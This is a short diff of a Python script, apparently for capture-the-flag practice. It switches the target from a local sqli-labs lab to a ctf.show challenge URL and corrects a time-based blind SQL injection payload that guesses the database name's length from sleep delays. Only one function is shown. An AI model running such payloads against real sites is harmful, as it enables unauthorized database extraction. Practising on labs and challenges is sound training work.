@@ -1,7 +1,7 @@
 import requests
 import time
 
-url = "http://localhost/sqli-labs-master/Less-9/"
+url = "http://5df87368-28a5-4866-8ae0-401ba89ca640.challenge.ctf.show/api/v5.php"
 
 
 def timeout(url):
@@ -17,7 +17,8 @@ def getDbNameLen(url):
     dbNameLen = -1
     for i in range(1, 10):
         time.sleep(0.1)
-        payload = "?id=2 '+and+if (length(database())=" + str(i) + ",sleep(5),1) --+"
+        payload = "?id=2'+and+if (length(database())=" + str(i) + ",sleep(5),1) --+"
+        # ?id=2' + and + if(length(database())=i,sleep(5),1) --+
         fullUrl = url + payload
         print(fullUrl)
         if "timeout" in timeout(fullUrl):
